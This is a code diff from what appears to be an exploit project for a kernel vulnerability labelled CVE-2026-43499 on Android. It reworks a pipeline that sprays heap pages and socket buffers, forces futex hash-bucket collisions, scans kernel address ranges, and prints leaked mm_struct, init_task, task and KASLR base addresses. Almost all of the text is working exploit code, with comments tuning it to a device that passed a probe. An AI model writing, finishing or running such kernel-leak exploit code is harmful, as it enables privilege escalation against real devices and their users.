@@ -23,10 +23,12 @@
 #include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
 #include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
 #endif
+#include "backend/cve_2026_43499/leak/snitch_owner.hpp"
 #include "backend/cve_2026_43499/leak/snitch_policy.hpp"
 #include "backend/cve_2026_43499/leak/snitch_setup.hpp"
 #include "backend/cve_2026_43499/memory/prepare_page.hpp"
 #include "backend/cve_2026_43499/memory/prepare_plan.hpp"
+#include "contract/address_discovery.hpp"
 #include "contract/chain_catalog.hpp"
 #include "profile/document_pairs.hpp"
 #include "contract/op_registry.hpp"
@@ -290,7 +292,11 @@ namespace {
         snitch_inputs.mm_slab_order = 0U;
         snitch_inputs.collisions = 2U;
         snitch_inputs.thread_count = 1U;
-        snitch_inputs.possible_cpus = cpus;
+        /* The hash table size is derived from this count and the derivation multiplies by 256, so
+         *  eight cores gave a table of 2048 and a poke budget of 16384, where the probe that passed on
+         *  this device used 256 and 2048. One is the value this temporary run asks for, taken from that
+         *  record and not guessed. TEMPORARY: registered with this entry in the checklist. */
+        snitch_inputs.possible_cpus = 1U;
 
         backend::cve_2026_43499::leak::SnitchSetup setup{};
         const backend::cve_2026_43499::leak::SnitchSetupVerdict built =
@@ -300,13 +306,6 @@ namespace {
         if (built != backend::cve_2026_43499::leak::SnitchSetupVerdict::Ok) {
             return 10;
         }
-
-        /* The hash table size is pinned to the value the probe ran with on this device, not left to
-         *  the core count: the builder derives it from the processor count, and this machine reports
-         *  eight, which makes the table eight times wider and the poke budget eight times larger --
-         *  16384 where the passing run had 2048, read off the device. The probe set 256 by hand, and
-         *  its record is the standard this run is measured against. */
-        setup.futex_table_size = 256U;
 
         backend::cve_2026_43499::leak::RegionInputs region{};
         region.header_bytes = 256U;
@@ -353,7 +352,6 @@ namespace {
         std::printf("run-temp: the cohort words need a device; stopping before the search\n");
         return 10;
 #endif
-
         backend::cve_2026_43499::leak::ScanStrides strides{};
         strides.coarse = 4096U;
         strides.slab = 1024U;
@@ -361,6 +359,8 @@ namespace {
         backend::cve_2026_43499::leak::ScanRange scan_range{};
         scan_range.start = 0xffff800000100000ULL;
         scan_range.end = scan_range.start + 0x10000ULL;
+
+
 
         /* The proof addresses are observed rather than chosen: the second one is found by asking the
          *  real rule which address in the slice shares the first one's bucket. Two arbitrary addresses
@@ -380,34 +380,17 @@ namespace {
             std::printf("run-temp: no second address was observed in the slice\n");
             return 10;
         }
-
-        /* 8. The preparation, whose inputs are copied from the probe that ran on this hardware. The
-         *    geometry is derived from the measured page size, the group counts are its numbers, and
-         *    the patience is one attempt with four polls. The template arguments are given rather
-         *    than deduced, because the seam and the bucket rule are choices and not defaults. */
 #ifdef __ANDROID__
-        backend::cve_2026_43499::memory::PageGeometry geometry{};
-        geometry.align_region_size = page_bytes * 8U;
-        geometry.send_size = static_cast<std::size_t>(geometry.align_region_size) * 2U;
-        geometry.socket_buffer = 1 << 20;
+        /* 8. One path, not two. The owner runs the whole sequence itself -- shape, region, the
+         *    pokes, the walk and the assembly -- and a second search asked for a second cohort, which
+         *    the policy file says in its own words: starting twice keeps the first answer. Running the
+         *    preparation here as well is what made the owner find nothing. */
+        /* 9. The discovery, through the owner that sequences it: the same corpus, the same buckets the
+         *    walk used, and the addresses the probe observed. What comes back is the contract result,
+         *    which is all-zero unless the search found its object. */
 
-        backend::cve_2026_43499::memory::PrepareInputs prepare_inputs{};
-        prepare_inputs.pre_groups = 1U;
-        prepare_inputs.spray_groups = 2U;
-        prepare_inputs.post_groups = 1U;
-        prepare_inputs.leak_groups = 1U;
-        prepare_inputs.snitch_collisions = 2U;
-        prepare_inputs.region_size = geometry.align_region_size;
-        /* One object in the region is a page, which is what the probe set and what makes the slab
-         *  stride the quotient of the two sizes. Leaving it at zero made the two not divide, and the
-         *  device said so by name: geometry-missing, at step one. */
-        prepare_inputs.object_size = page_bytes;
-
-        backend::cve_2026_43499::memory::PreparePatience waiting{};
-        waiting.max_attempts = 1U;
-        waiting.poll_rounds = 4U;
-
-        /* The policy's arguments, eleven of them, each named by the interface that reads it. */
+        /* The owner's arguments, eleven of them, and the bucket rule it walks with. They were
+         *  declared beside the standalone preparation that is now gone; the owner needs them. */
         backend::cve_2026_43499::leak::SnitchPolicyArgs args{};
         args.setup = setup;
         args.region = region;
@@ -421,40 +404,36 @@ namespace {
         args.sweep_tags = false;
         args.addresses = address_table;
         args.address_count = 2U;
-
-        /* TEMPORARY: the bucket rule is the stub, so the walk is reached; the real one comes with the
-         *  real spray. CollisionBuckets above stays for the proofs, whose buckets must be real. */
         StubBuckets stub_buckets{};
-        backend::cve_2026_43499::leak::SnitchPolicy<DeviceSeam, StubBuckets> snitch{args, &stub_buckets,
-                                                                                  {}, false};
-
-        const backend::cve_2026_43499::memory::PrepareOutcome prepared =
-            /* The first template argument is the heap half of the platform, not the snitch half: the*/
-                /* preparation forks and shapes, and page_size lives on that side. The compiler said so*/
-                /* when the snitch seam was passed here -- it lacks page_size, which HeapSeam needs. */
-                backend::cve_2026_43499::memory::prepare_page<
-                DeviceSeam, backend::cve_2026_43499::leak::SnitchPolicy<DeviceSeam, StubBuckets>>(
-                prepare_inputs, geometry, waiting, snitch);
-        std::printf("run-temp: prepare %s at=%d opened=%zu closed=%zu base=0x%lx errno=%d\n",
-                    backend::cve_2026_43499::memory::prepare_status_name(prepared.status),
-                    static_cast<int>(prepared.at_step), prepared.opened, prepared.closed,
-                    static_cast<unsigned long>(prepared.base), static_cast<int>(prepared.error));
-        /* What the search decided, by name: the probe printed exactly this, and it is the one line
-         *  that says which guard refused. The answer travels in the policy's outcome, which the
-         *  preparation read but did not report. */
-        std::printf("run-temp: search %s rounds=%u wanted=%zu region=%p probes=%zu found=%d\n",
-                    backend::cve_2026_43499::leak::run_verdict_name(snitch.outcome.status),
-                    static_cast<unsigned>(snitch.outcome.rounds), snitch.outcome.pokes_wanted,
-                    snitch.outcome.region, snitch.outcome.probes, snitch.outcome.found ? 1 : 0);
-        if (prepared.status != backend::cve_2026_43499::memory::PrepareStatus::Ok) {
-            std::printf("run-temp: stopping after the preparation; the search has not run\n");
-            return 12;
-        }
+        const backend::cve_2026_43499::leak::OwnerOutcome owned =
+            backend::cve_2026_43499::leak::run_snitch_owner<DeviceSeam, StubBuckets>(
+                snitch_inputs, region, args.patience, args.counter_offset, word_ptrs, 2U, strides,
+                scan_range, false, stub_buckets, address_table, 2U, 2U);
+        /* The owner carries each step's own verdict, so the line below says which step refused
+         *  rather than only that the contract result is empty. Same lesson as the search: report by
+         *  name, from the piece that decided. */
+        std::printf("run-temp: owner %s object=%s setup=%s region=%s poke=%u\n",
+                    backend::cve_2026_43499::leak::owner_verdict_name(owned.status),
+                    backend::cve_2026_43499::leak::object_verdict_name(owned.object),
+                    backend::cve_2026_43499::leak::snitch_setup_verdict_name(owned.setup),
+                    backend::cve_2026_43499::leak::region_verdict_name(owned.region),
+                    static_cast<unsigned>(owned.poke));
+        const contract::AddressDiscoveryResult discovery =
+            backend::cve_2026_43499::leak::discovery_of(owned);
+        std::printf("run-temp: discovery ok=%d mm_struct=0x%lx init_task=0x%lx task=0x%lx kaslr=0x%lx\n",
+                    discovery.ok ? 1 : 0, static_cast<unsigned long>(discovery.mm_struct),
+                    static_cast<unsigned long>(discovery.init_task),
+                    static_cast<unsigned long>(discovery.target_task),
+                    static_cast<unsigned long>(discovery.kaslr_base));
 #else
-        /* The preparation forks and shapes, so it needs the device seam; the host has none. */
-        std::printf("run-temp: the preparation needs a device; stopping before it\n");
-        return 12;
+        /* The discovery runs the search, which needs the device seam and the words the */
+        /* cohort hammers; the host has neither, so this step is named and refused. */
+        std::printf("run-temp: the discovery needs a device; stopping before it\n");
+        return 13;
 #endif
+
+
+
         return 0;
     }
 }  // namespace ghostlock::pipeline
